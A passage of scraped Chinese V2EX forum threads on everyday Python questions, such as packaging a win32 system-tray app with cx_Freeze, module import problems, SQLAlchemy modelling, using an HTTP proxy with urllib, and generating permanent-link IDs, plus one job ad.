\n    FIRST_ID = 1023\n    \n    def __init__(self,\n                 icon,\n                 hover_text,\n                 menu_options,\n                 on_quit=None,\n                 default_menu_index=None,\n                 window_class_name=None,):\n        \n        self.icon = icon\n        self.hover_text = hover_text\n        self.on_quit = on_quit\n        \n        menu_options = menu_options + (('QUIT', None, self.QUIT),)\n        self._next_action_id = self.FIRST_ID\n        self.menu_actions_by_id = set()\n        self.menu_options = self._add_ids_to_menu_options(list(menu_options))\n        self.menu_actions_by_id = dict(self.menu_actions_by_id)\n        del self._next_action_id\n        \n        \n        self.default_menu_index = (default_menu_index or 0)\n        self.window_class_name = window_class_name or \"SysTrayIconPy\"\n        \n        message_map = {win32gui.RegisterWindowMessage(\"TaskbarCreated\"): self.restart,\n                       win32con.WM_DESTROY: self.destroy,\n                       win32con.WM_COMMAND: self.command,\n                       win32con.WM_USER+20 : self.notify,}\n        # Register the Window class.\n        window_class = win32gui.WNDCLASS()\n        hinst = window_class.hInstance = win32gui.GetModuleHandle(None)\n        window_class.lpszClassName = self.window_class_name\n        window_class.style = win32con.CS_VREDRAW | win32con.CS_HREDRAW;\n        window_class.hCursor = win32gui.LoadCursor(0, win32con.IDC_ARROW)\n        window_class.hbrBackground = win32con.COLOR_WINDOW\n        window_class.lpfnWndProc = message_map # could also specify a wndproc.\n        classAtom = win32gui.RegisterClass(window_class)\n        # Create the Window.\n        style = win32con.WS_OVERLAPPED | win32con.WS_SYSMENU\n        self.hwnd = win32gui.CreateWindow(classAtom,\n                                          self.window_class_name,\n                                          style,\n                                          0,\n                                          0,\n                                          win32con.CW_USEDEFAULT,\n                                          win32con.CW_USEDEFAULT,\n                                          0,\n                                          0,\n                                          hinst,\n                                          None)\n        win32gui.UpdateWindow(self.hwnd)\n        self.notify_id = None\n        self.refresh_icon()\n        \n        win32gui.PumpMessages()\n\n    def _add_ids_to_menu_options(self, menu_options):\n        result = []\n        for menu_option in menu_options:\n            option_text, option_icon, option_action = menu_option\n            if callable(option_action) or option_action in self.SPECIAL_ACTIONS:\n                self.menu_actions_by_id.add((self._next_action_id, option_action))\n                result.append(menu_option + (self._next_action_id,))\n            elif non_string_iterable(option_action):\n                result.append((option_text,\n                               option_icon,\n                               self._add_ids_to_menu_options(option_action),\n                               self._next_action_id))\n            else:\n                print ('Unknown item', option_text, option_icon, option_action)\n            self._next_action_id += 1\n        return result\n        \n    def refresh_icon(self):\n        # Try and find a custom icon\n        hinst = win32gui.GetModuleHandle(None)\n        if os.path.isfile(self.icon):\n            icon_flags = win32con.LR_LOADFROMFILE | win32con.LR_DEFAULTSIZE\n            hicon = win32gui.LoadImage(hinst,\n                                       self.icon,\n                                       win32con.IMAGE_ICON,\n                                       0,\n                                       0,\n                                       icon_flags)\n        else:\n            print (\"Can't find icon file - using default.\")\n            hicon = win32gui.LoadIcon(0, win32con.IDI_APPLICATION)\n\n        if self.notify_id: message = win32gui.NIM_MODIFY\n        else: message = win32gui.NIM_ADD\n        self.notify_id = (self.hwnd,\n                          0,\n                          win32gui.NIF_ICON | win32gui.NIF_MESSAGE | win32gui.NIF_TIP,\n                          win32con.WM_USER+20,\n                          hicon,\n                          self.hover_text)\n        win32gui.Shell_NotifyIcon(message, self.notify_id)\n\n    def restart(self, hwnd, msg, wparam, lparam):\n        self.refresh_icon()\n\n    def destroy(self, hwnd, msg, wparam, lparam):\n        if self.on_quit: self.on_quit(self)\n        nid = (self.hwnd, 0)\n        win32gui.Shell_NotifyIcon(win32gui.NIM_DELETE, nid)\n        win32gui.PostQuitMessage(0) # Terminate the app.\n\n    def notify(self, hwnd, msg, wparam, lparam):\n        if lparam==win32con.WM_LBUTTONDBLCLK:\n            self.execute_menu_option(self.default_menu_index + self.FIRST_ID)\n        elif lparam==win32con.WM_RBUTTONUP:\n            self.show_menu()\n        elif lparam==win32con.WM_LBUTTONUP:\n            pass\n        return True\n        \n    def show_menu(self):\n        menu = win32gui.CreatePopupMenu()\n        self.create_menu(menu, self.menu_options)\n        #win32gui.SetMenuDefaultItem(menu, 1000, 0)\n        \n        pos = win32gui.GetCursorPos()\n        # See http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/menus_0hdi.asp\n        win32gui.SetForegroundWindow(self.hwnd)\n        win32gui.TrackPopupMenu(menu,\n                                win32con.TPM_LEFTALIGN,\n                                pos[0],\n                                pos[1],\n                                0,\n                                self.hwnd,\n                                None)\n        win32gui.PostMessage(self.hwnd, win32con.WM_NULL, 0, 0)\n    \n    def create_menu(self, menu, menu_options):\n        for option_text, option_icon, option_action, option_id in menu_options[::-1]:\n            if option_icon:\n                option_icon = self.prep_menu_icon(option_icon)\n            \n            if option_id in self.menu_actions_by_id:                \n                item, extras = win32gui_struct.PackMENUITEMINFO(text=option_text,\n                                                                hbmpItem=option_icon,\n                                                                wID=option_id)\n                win32gui.InsertMenuItem(menu, 0, 1, item)\n            else:\n                submenu = win32gui.CreatePopupMenu()\n                self.create_menu(submenu, option_action)\n                item, extras = win32gui_struct.PackMENUITEMINFO(text=option_text,\n                                                                hbmpItem=option_icon,\n                                                                hSubMenu=submenu)\n                win32gui.InsertMenuItem(menu, 0, 1, item)\n\n    def prep_menu_icon(self, icon):\n        # First load the icon.\n        ico_x = win32api.GetSystemMetrics(win32con.SM_CXSMICON)\n        ico_y = win32api.GetSystemMetrics(win32con.SM_CYSMICON)\n        hicon = win32gui.LoadImage(0, icon, win32con.IMAGE_ICON, ico_x, ico_y, win32con.LR_LOADFROMFILE)\n\n        hdcBitmap = win32gui.CreateCompatibleDC(0)\n        hdcScreen = win32gui.GetDC(0)\n        hbm = win32gui.CreateCompatibleBitmap(hdcScreen, ico_x, ico_y)\n        hbmOld = win32gui.SelectObject(hdcBitmap, hbm)\n        # Fill the background.\n        brush = win32gui.GetSysColorBrush(win32con.COLOR_MENU)\n        win32gui.FillRect(hdcBitmap, (0, 0, 16, 16), brush)\n        # unclear if brush needs to be feed.  Best clue I can find is:\n        # \"GetSysColorBrush returns a cached brush instead of allocating a new\n        # one.\" - implies no DeleteObject\n        # draw the icon\n        win32gui.DrawIconEx(hdcBitmap, 0, 0, hicon, ico_x, ico_y, 0, 0, win32con.DI_NORMAL)\n        win32gui.SelectObject(hdcBitmap, hbmOld)\n        win32gui.DeleteDC(hdcBitmap)\n        \n        return hbm\n\n    def command(self, hwnd, msg, wparam, lparam):\n        id = win32gui.LOWORD(wparam)\n        self.execute_menu_option(id)\n        \n    def execute_menu_option(self, id):\n        menu_action = self.menu_actions_by_id[id]      \n        if menu_action == self.QUIT:\n            win32gui.DestroyWindow(self.hwnd)\n        else:\n            menu_action(self)\n            \ndef non_string_iterable(obj):\n    try:\n        iter(obj)\n    except TypeError:\n        return False\n    else:\n        #return not isinstance(obj, basestring)#python2.7 user\n        return not isinstance(obj, (str))\n    \n    \n    \n\n# Minimal self test. You'll need a bunch of ICO files in the current working\n# directory in order for this to work...\n\nimport itertools, glob\n\nicons = itertools.cycle(glob.glob('*.ico'))\nhover_text = \"com1 9600 n 8 1 \\n load:902\"\nprint (glob.glob('*.ico'))\ndef hello(sysTrayIcon): print (\"Hello World.\")\ndef simon(sysTrayIcon): print (\"Hello Simon.\")\ndef rehandle(sysTrayIcon): print (\"rehandling......\")\ndef switch_icon(sysTrayIcon):\n    sysTrayIcon.icon = icons.__next__()\n    sysTrayIcon.refresh_icon()\nmenu_options = (('Say Hello', icons.__next__(), hello),\n                ('Switch Icon', None, switch_icon),\n                ('rehandle',icons.__next__(), rehandle),\n                ('A sub-menu', icons.__next__(), (('Say Hello to Simon', icons.__next__(), simon),\n                                              ('Switch Icon',icons.__next__(), switch_icon),\n                                             ))\n               )\ndef bye(sysTrayIcon): print ('Bye, then.')\nprint (os.path.abspath(os.curdir))\nprint (sys.argv[0])\nSysTrayIcon(icons.__next__(), hover_text, menu_options, on_quit=bye, default_menu_index=1)\n#print (os.getcwd())\n#SysTrayIcon(icons.next(), hover_text, menu_options, on_quit=bye, default_menu_index=1)\n\n\n#cxfreeze  D:\\test\\sysTRyIco3.py  --target-dir D:\\runexe --base-name=Win32GUI\n</code></pre>\n</div></div>"], "reply": "5", "tittle": "我照网上写了一个最小化到桌面的程序，直接运行不报错，但是用 cxfreeze 编译后报 ImportError: No module named 'pywintypes'错，麻烦帮忙看看 python3.5.2 win7 32 位系统", "comment": ["都直接用 win32 api 了，为啥不直接 C 呢", "把主 py 脚本和图标、编译脚本等文件全部放到 python35/LIB 中 再编译就行了", " \r", "我把程序放到安装目录下面，运行还是提示 ImportError: No module named 'pywintypes'\r", "    C:\\Users\\Administrator>cxfreeze  C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python35-32\\Lib\\sysTRyIco3.py  --target-dir D:\\runexe --base-name=Win32GUI\r", "\r", "        ---------------------------\r", "        cx_Freeze: Python error in main script\r", "        ---------------------------\r", "        Traceback (most recent call last):\r", "          File \"C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\cx_Freeze\\initscripts\\__startup__.py\", line 12, in <module>\r", "            __import__(name + \"__init__\")\r", "          File \"C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\cx_Freeze\\initscripts\\Console.py\", line 21, in <module>\r", "            scriptModule = __import__(moduleName)\r", "          File \"C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python35-32\\Lib\\sysTRyIco3.py\", line 6, in <module>\r", "            import win32gui_struct\r", "          File \"C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python35-32\\lib\\site-packages\\win32\\lib\\win32gui_struct.py\", line 36, in <module>\r", "            import pywintypes\r", "        ImportError: No module named 'pywintypes'\r", "\r", "        ---------------------------\r", "        确定   \r", "        ---------------------------\r", "\r", "请问下编译脚本 在哪里找到，我直接 cxfreeze 运行的", "试试 pyinstaller 或者 py2exe 吧 cx_Freeze 错误太多了", "pyinstaller 试过，报错更多， py2exe 没试，我一会试试， python2.7 我打包没问题， python3.5 我修改的程序报那个错，在另一台笔记本上面也报同样错，主要想实现右下角图标菜单显示， python 有没有其他只显示有下角图标的程序"]},
{"content": ["<div class=\"topic_content\">mac 自带的 python 是 2.7 ，然后我安装了 3.5 ，然后今天用 bs4 的模块，用 ide 运行就显示 no module named bs4 ，但是在终端是可以 import 的。我找了很多资料，都是说 python3 的 bs4 模块导入是用 from bs4 import BeautifulSoup ，不是 from BeautifulSoup import BeautifulSoup ，我改了，依然还是显示 no module named bs4 。模块重装过，终端、 homebrew 、下载安装都试过，就是显示 no module named bs4 ！也有说是权限问题，我也 sudo pip ，还是显示 no module named bs4</div>"], "reply": "25", "tittle": "python 模块遇到一个很奇葩的问题", "comment": ["请用 virtualenv", "如果你用的 pycharm 的话,需要在 ide 里设置 python 路径", " 没有用 pycharm ，，，官放的 python 3.5", " 不用这个没有解决方法？", "没有用其他的工具，就是 python 自带的 IDLE", "pip3?", "了解原理没啥不能解决的, 你的问题是 py3 的 python 把 py2 的覆盖掉了\r", "你自己 ln -s 建一个软联换个名字就好了嘛", "另外 PyCharm 可以在配置里选你要用的 Python 版本啊", " 没有覆盖！", " 你们说的这些我都知道的，现在就是在终端可以 import 已用 python IDLE 就是无法 import", "import sys\r", "print sys.path\r", "然后分别在这些路径找找有没有 bs4 模块，然后再检查你的 pip 安装 bs4 模块默认是哪个路径。如果 pip 默认安装模块的路径不在里面,就添加进去。如果在里面还 import 不出那我真不懂了😂", "如果你在是 IDLE 无法 import 。。也许你打开的 IDLE 是 2.7 的吧。。顺便我推荐 Pycharm 。 IDLE 不好用。。", "因为 py2 py3 安装在同环境下，所以要确认 bs4 是安装给 py 。\r", "如果直接是 pip install ，则很可能是系统默认的 py2 版 pip ，因此安装时需要明确安装 py3 版， pip3 install 。\r", "然后运行时默认的 python main.py 也是默认系统自带 py2 ，需要明确 python3 main.py 。", " 貌似不是这个问题，我删除在安装试试", " 我安装的时候注意这个问题的，不是这个问题", " 不是这个问题，这个错误我不会犯的啊，不是一些基本的操作问题啊", "放弃 IDLE,用 pycharm 没问题", "估计 idle 不是 3.5 版 python interpreter 运行的", "也不说是啥 IDE", "请问楼主，怎么安装的呢？ pip3 install 还是直接 pip 呢？\r", "\r", "ide 显示的 python 版本是多少呢？能用 os 看下吗", " IDLE 是 3.5 的。。。", " 谢谢大家，都不是你们说的这些基本操作问题啊，这些我是知道的，我两个版本的 2.7  3.5 ，我就是用 python 自带的那个 IDLE ， pip 是安装自带的 2.7 ，我是用 pip3 安装 3.5 的模块啊，在终端进 3.5 ，模块可以用，但是用 python 的 IDLE 运行就会出错，我不搞了，直接用 pycharm 了，在这个里面运行没问的", "pip list  pip3 list 分别看看安装到哪儿去了就知道了", " 谢谢  不是这个问题，里面都有这些模块的", "pip3"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>招兵买马啦！！！小伙伴们看过来呀\n爬虫工程师\n岗位职责：\n1 、实时网站登录、实现对各种网页的解析、提取；\n2 、数据智能抽取、校对、清洗；（了解分布式架构）\n3 、可以进行抓取及抽取系统的新技术研究；\n4 、负责信息提取系统的架构设计及算法实现。\n任职要求：\n1 、本科以上学历，三年以上相关工作经验，计算机相关专业；\n2 、深入理解 Http 协议和 web 登录认证机制，了解网页验证识别等技术，能模拟浏览器操作爬虫，具有多线程编程经验；\n3 、熟悉各种 Web 前端技术，精通正则表达式，熟练掌握 java,python,scala 中的至少一种，具备扎实的编码能力；\n4 、熟悉自然语言处理，信息抽取优先考虑；\n5 、工作认真踏实，有较强的学习能力和良好的团队协作沟通能力。</p>\n</div></div>", "<div class=\"topic_content\">不好意思忘记写公司名称、地址和薪酬啦。。。。我们是一家集互联网金融中介服务、互联网财富管理、创新型金融服务于一体的综合性互联网和金融服务企业。名字叫做：草根金融信息服务（杭州）有限公司，集团旗下包括：草根投资、中投融、量财富、易观长河基金、德鑫典当等子品牌。工作地点是在杭州余杭区，薪酬面议范围在 10K-20K 区间，正在急聘人才呀， java 开发工程师、架构师、前端开发、运维工程师、安卓开发工程师、数据挖掘工程师，招聘的英雄很多呀！！！感兴趣的与我联系吧。。。杨小姐 qq:1131638516,非诚勿扰呐</div>"], "reply": "目前尚无回", "tittle": "我们在这里等你。。。", "comment": []},
{"content": ["<div class=\"topic_content\">小弟是新学 python 的，最近有一个小程序。使用 python 设置环境变量。\r<br>\r<br>但是小弟发现在 python 进程中设置的环境变量只有在 python 进程中才可以使用。对当前用户的环境变量不会有任何修改。。\r<br>\r<br>请问如何使用 python 改变当前用户在 linux 操作系统下的环境变量呢？？\r<br>\r<br>操作系统： redhat 6.5 X64 企业版\r<br>\r<br>当前 shell ： csh\r<br>\r<br>python 版本： python 2.7\r<br>\r<br>当前用户：非 root\r<br>\r<br>需求：使用 python 脚本设置环境变量后，在 csh 中使用 env 可以查看到。\r<br>\r<br>谢谢各位大爷！~~~~</div>"], "reply": "3", "tittle": "关于 python 设置环境变量的问题", "comment": ["用 python 读写 .xinit 文件", " 能详细点么？？？", ">> 在 python 进程中设置的环境变量只有在 python 进程中才可以使用。对当前用户的环境变量不会有任何修改。。 \r", "\r", "这不是 python 的问题。 linux 环境变量都是继承父进程的。\r", "如果你在.xsession 中设置环境变量，会对整个 X 会话生效。\r", "如果你在.bashrc 中设置环境变量，会对所有 bash 生效。\r", "如果桌面环境要增加“全局”的环境变量，必须注销、重新登录。\r", "\r", "如果想绕过这个限制，就在设置环境变量之后，在同一个进程启动目标程序。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>class Employee(Base):\n    __tablename__ = 'employee'\n    id = Column(Integer, primary_key=True)\n    name = Column(String(50))\n    type = Column(String(50))\n\n    __mapper_args__ = {\n        'polymorphic_identity':'employee',\n        'polymorphic_on':type\n    }\n    \nclass Engineer(Employee):\n    __tablename__ = 'engineer'\n    id = Column(Integer, ForeignKey('employee.id'), primary_key=True)\n    engineer_name = Column(String(30))\n\n    __mapper_args__ = {\n        'polymorphic_identity':'engineer',\n    }\n\nclass Manager(Employee):\n    __tablename__ = 'manager'\n    id = Column(Integer, ForeignKey('employee.id'), primary_key=True)\n    manager_name = Column(String(30))\n\n    __mapper_args__ = {\n        'polymorphic_identity':'manager',\n    }    \n</code></pre>\n<p>如上有 员工、工程师、管理者 3 个表。</p>\n<p>e = Employee.query.filter(xxx=xxx).first()</p>\n<p>我想给 e 加上 Manager 和 Engineer 的角色应该如何表达？</p>\n<p>就是一个员工可以有多种角色。</p>\n</div></div>"], "reply": "4", "tittle": "请教 SQLAlchemy 继承问题", "comment": ["表本身就建的有问题", "就不该拆表，加一个 role 字段，然后关联到 role 表", "学好范式………", "看官方文档想到的而已，谢谢大家。"]},
{"content": ["<div class=\"topic_content\">楼主编程经验有限，代码量也有限。今天在敲代码的时候发现了一个问题：\r<br>self.&lt;属性&gt;可以跨方法访问，那么它既可以用来代替参数，也可以用来代替返回值。\r<br>\r<br>我的问题是，那种情况下用参数，那种情况下需要返回，那种情况下需要用 self.&lt;属性&gt;？\r<br>\r<br>谢谢。</div>", "<div class=\"topic_content\">class ClassDemo(object):\r<br>    def method_a1(self):\r<br>        return self.argu + 1\r<br>\r<br>    def method_a2(self):\r<br>        self.ret_data =  self.argu + 1\r<br>\r<br>    def method_a3(self,input_argument):\r<br>        return input_argument + 1\r<br>\r<br>    def method_b1(self):\r<br>        self.argu = 1\r<br>        ret_data = self.method_a1()\r<br>        print ret_data\r<br>\r<br>    def method_b2(self):\r<br>        self.method_a2()\r<br>        print self.ret_data\r<br>\r<br>    def method_b3(self):\r<br>        print self.method_a3(1)\r<br>\r<br>instance_demo = ClassDemo()\r<br>instance_demo.method_b1()\r<br>instance_demo.method_b2()\r<br>instance_demo.method_b3()\r<br>\r<br>大概就是这个意思吧。。。\r<br>b1,b2,b3 都能得到相同的结果。但是参数和返回值的方式都不同。那么哪种情况下用那个方法呢。</div>"], "reply": "20", "tittle": "关于面相对象编程的一个问题：返回值和属性的设置", "comment": ["没看懂你在说什么", " 突然觉得应该先给楼主推荐《 Effective C++》……", " 哈哈哈哈 来不及了。只敲过 python 。不吝赐教啊。。。很诚恳的说。", "我也没懂楼主在说什么", "哈哈哈哈，果然只有新手能看懂新手的疑惑啊。我最近写工具的时候也有这个疑惑。\r", "\r", "class A():", "不要使用 self.<属性>用来传递临时的参数，除非参数是这个对象的属性。\r", "我已经不懂我在说什么了", "最好使用返回值和参数，尽量不要让函数运行结果依赖于外部状态。", "没太懂。。。", " 那么请问，对象的属性是用来做什么的？", "然而我并没有写过 python 。\r", "\r", "我的看法是，公用的方法也就是要对外暴露的方法肯定是用参数和返回值的。\r", "\r", "私有的方法之间可以互相用类属性，私有方法最终是为公有的方法服务的。", "你说的跨方法访问，不过是一个类里的不同方法都能访问到类里的属性罢了。\r", "\r", "凡是临时的可有可无的变量，都不要设置成类属性，用普通变量就好了。如果你学的是 java ，用 getter/setter 就不会想出这样的问题了。\r", "\r", "你也可以了解一下函数式编程里的函数是怎么用的，就会对 function/method 有个比较清楚的认识了。\r", "\r", "我也不知道自己在说什么了……", " 那么我们举私有方法的例子，\r", "像我之前用函数的方式做，跳进一个函数里面第一眼看参数，第二眼看返回值，这样就能基本确定这个函数的输入和输出是什么，阅读效率很高（目的性强）。\r", "但是今天封了一个对象出来。各个私有方法之间用私有属性传递。功能实现了，。但是看着怪怪的。随着项目变大代码量增长岂不是阅读起来要乱套？\r", "\r", "请指点。多谢啦！", " \r", "我今天遇到的情况，用对象的属性来做确实方便。。。只是写完之后发现，如果过段时间再看，或者别人来看我写的东西，会觉得怪怪的，不知道是我看代码的方式怪还是我写的怪。\r", "\r", "所以发出来想和前辈们请教下。\r", "\r", "至于您说的函数式编程和 java 。。。", " 然而现在得到结论了没？ :)", " 属性是描述对象特征的，他可以让各个方法共享数据，但他不是为了传递数据设计的。我觉得，如果一个属性和对象没有逻辑上的包含从属关系，就不适合写成属性。", " 我明天在去瞅瞅我的代码然后在向您请教。", "要按照具体使用场景要看，可以想成一个银行账号，属性值表示余额\r", "a1 方法就是看一下存进去一块钱之后，余额是多少\r", "a2 方法就是真的存进去一块钱，做了这个操作\r", "a3 就相当于是个计算器，算一下假如某个人有多少钱，加一块钱之后是多少", " 我有一个小问题。\r", "您说的真的存进去一块钱（ a2 ）是不是应该是这样的：\r", "def method_a2(self): \r", "    self.argu += 1", " 对，是应该这样", " 没有，自己看怎么方便怎么来"]},
{"content": "", "reply": "2", "tittle": "sqlalchemy 在创建表的时候，能不能给表字段加上注释？\r\n看了官方文档，关于 Column 的内容，没有 comment 相关的内容。", "comment": ["暂时为止，不能。参考官方文档 Column 的 doc 属性说明『 doc – optional String that can be used by the ORM or similar to document attributes. This attribute does not render SQL comments (a future attribute ‘ comment ’ will achieve that).』", " 嗯， 我也看到了这个，以为还有另外的用法 \r", "感谢~"]},
{"content": ["<div class=\"topic_content\">&lt;image src=\"<img src=\"http://ww3.sinaimg.cn/mw690/6de36fdcgw1fa1w5hgjqvj20tz0w1dq4.jpg\" class=\"embedded_image\" border=\"0\"> \"&gt;</div>"], "reply": "20", "tittle": "求教一下使用 Dash 查看 Python 相关文档的正确姿势 : )", "comment": ["python3:sys.path", "dash 对 python 文档的索引确实很差，一般都直接 Google+SO", "\r", "\r", "推荐这个服务。", " 你是针对某一个具体的问题的搜索？ Dash 用来搜索方法和模块比较常用吗？", " 挺不错的～  不知道是不是翻墙的原因，访问没有秒开  ; )", " 比 dash 爽 啊", " Dash 搜模块和模块里边的方法效果还行， builtin 就不怎么行了。具体的语法简直没法搜。主要痛点是 builtin 的搜索基本搞不定。 devdocs 也一样，都怪文档本身组织的问题。你搜 list, str 这些 builtin 的方法能烦死你。", " 你是说内建函数的搜索吗？\r", " ", "  \r", "\r", "win 用户表示啥是 dash ???", "....", "同推荐三楼说的那个，比 Dash 好用。", "你有了 dash 还需要一个 Alfred 然后用起来就很爽了。", "  Dash+Alfred 如何配合使用？", " dash -> preference -> integration -> alfred 双击整合完毕。\r", "\r", "快捷键唤出 alfred \r", "\r", "  确实牛逼 不过要买 Powerpack...", " 你用了会发现，你后边会很喜欢这玩意。 dash 只是一小部分。 19 英镑大概 160RMB 左右还是值得买一下。", " 各种 workfolw 实在是很方便。做之前用的盗版的。然后更新用不了了。然后就支持作者入了正版了。", " windows 和 linux 用户可以用 zeal 代替 dash ，还不需要付费，完整功能：\r", "虽然已购 DASH ，但觉得三楼方案优于 DASH", " 渣, 用过一次, 用得不舒服."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>import urllib.request\nimport socket\nimport random\n\nUser_Agent = ['Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',\n\t\t\"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\",\n\t\t'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)',\n\t\t'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)',\n\t\t'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)',\n\t\t'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)',\n\t\t'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)',\n\t\t'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0',\n\t\t'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)',\n\t\t'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)'\n\t\t]\nshareUrl = 'http://ip.chinaz.com/getip.aspx'\nproxy = {'http':'106.120.78.129:80'}\ntry:\n\t#proxy_support=urllib.request.ProxyHandler({'http':proxy})\n\tproxy_support=urllib.request.ProxyHandler(proxy)\n\topener = urllib.request.build_opener(proxy_support)\n\trandom_userAget = random.choice(User_Agent)\n\treq = urllib.request.Request(shareUrl)\n\treq.add_header(\"User-Agent\", random_userAget) \n\tres = urllib.request.urlopen(req).read().decode(\"utf8\")\t\n\tprint (res)\nexcept Exception as e:\n\tprint (e)\n</code></pre>\n</div></div>"], "reply": "11", "tittle": "用 IP 代理访问 ", "comment": ["不是高匿代理？", " 是要换个高匿的代理才可以吗？，试了下换个 还是显示本机地址。。", "不是全局代理吧？或者说代理设定的 route 并没有把 chinaz 的网站包含进代理路线", "你把浏览器重启试一下？这站 keep-alive 的时间似乎非常的长，可能你换代理之后浏览器依然使用了首次直连建立的 socket", " 我用上面的程序 run 的应该跟我浏览器没关系吧？  换了几个 proxy 试试，返回的 res 还是同一个。。", " 120.52.72.56:80 试试这个\r", "\r", "curl ", " -x '", "'\r", "{ip:'120.52.72.56',address:'北京市 联通云 BGP 数据中心'}\r", "\r", "我这儿是没显示本机的", "虽然你定义了代理，但是你使用了代理吗\r", "opener req", "原来缺少了一句 感谢各位大锅帮助 结帖", "点 [这里](url \"http://ip.chinaz.com/getip.aspx\")", " 是的 少了设置 ( ꒪Д꒪)ノ"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如：\n百度贴吧:<br>\n<a href=\"http://tieba.baidu.com/p/4855169060/\" rel=\"nofollow\">http://tieba.baidu.com/p/4855169060/</a><br>\n什么值得买:<br>\n<a href=\"http://www.smzdm.com/p/6664641/\" rel=\"nofollow\">http://www.smzdm.com/p/6664641/</a><br>\nv2ex:<br>\n<a href=\"https://www.v2ex.com/t/322033\" rel=\"nofollow\">https://www.v2ex.com/t/322033</a></p>\n<p>这个后面的数字是通过什么规则生成的，还是直接用数据库的自增 id</p>\n</div></div>"], "reply": "25", "tittle": "怎么设计一个网站的永久链接", "comment": ["v2 肯定是自增 id", " 嗯，应该是。我刚访问了一下\r ", " \r ", " \r ", "\r", "应该是自增 ID ，如果是用数据库自增 id ，那这个 id 是保存到数据库的时候生成的，感觉这样设计不太好吧。不知道还有没有其他的方式生成，可以在保存到数据库之前就能生产一个唯一的链接 id ，但生成的数字 id 也不能太长。", "自增是个非常简单实用的解决方案。当然考虑到隐私保护或者大规模部署也有其解决方案，你可以搜搜 ID 策略。", "自增序列挺好的", "short uuid", " @", " 哦，那这个自增序列，是由保存到数据库的时候，由数据库的自增字段提供的吗？感觉这样的设计有问题，这个永久链接应该是网站 url 逻辑的一部分，不应该由数据库来生成。\r", "\r", " 看了一下能提供数字的短 id ，但不能保证唯一。应该需要自己写保证唯一的逻辑。", " 用的 hashids", " 居然没有 ", " 这不科学", " 写错了 居然没有 ", " 这不科学", "稍微大一些的数据量，一般不建议用自增吧。不过一般的应用根本到不了自增 ID 是瓶颈的状态 LOL\r", "\r", "据说有理想的是 随机数+uuid+时间戳 组合生成 ID ，看着有点长，其它没什么问题", " 您这个思维还是很独特的。。。只能说思维比较奇葩。\r", "不过可以自己写个发号器，根据时间、密钥等，生成唯一 uuid 。微博就是这么做的", " 哦，请看我贴出的网址的 url ，如 ", "  希望是短数字的不重复的。", " 自增 id+unix time 不就行了，不重复，无冲突，无法遍历。", " 谢谢的回复，不过这么说，那其实 unix timestamp 就是唯一的了，加不加自增 id 就无所谓了。自增 id 如果是数据库提供的话，那必须先查数据库（或由保存到数据库的时候返回的）才能得到。", " unix timestamp 还不至于唯一。精确到毫秒也不至于唯一，但是可以 time()+rnd(time())", "如果用的是 MySQL ，那么自增是个非常好的解决方案，如果因为某些原因用不了自增，那用 UUID 也可以", "id uid time", "UUID+unix timestamp", "规则上没有什么标准范式\r", "我觉得豆瓣的设计的就不错\r", "\r", "给你一个思路,把 URL 结构看成倒置树状结构\r", "什么地方用文件夹,什么地方用文件你就非常清楚了\r", "另外如果现在还考虑传统 SEO 的话,这个树应该是低而广阔的树,顾名思义就是目录不要深,摊开", "ID\r", "1. 自增\r", "2. 放号器", "时间戳并不唯一", " \r", "你只看到了  ", " ，你觉得 4855169060 这么大的数不可能是自增 ID ，但是你没有考虑到贴吧的流量有多大，发帖量有多大。\r", "最简单的， ", " 可以打开，而 ", " 提示“很抱歉，该贴已被删除。”，所以是帖子被删除了，而不是不曾存在过。", " 贴吧其实也是自增的，自增键确实是最简单、靠谱的方案。不过题主的要求也是可以实现的，不外乎就是时间戳、内部计数器组合成的，如果有多个业务或服务器，也可以把业务、服务器编号揉进来。内部计数器是不可少的，可以用 memecache 或 redis 实现，毕竟时间戳+随机数的形式也不能保证唯一。\r", "如果嫌长度太长，可以转为 16 进制或自定义进制。", "自增就很好理解了， UUID ，放号器上面也有朋友提到，以下供参考\r", "\r", "恰巧又碰到一篇关于这个的   ", "\r", "帖上来"]},
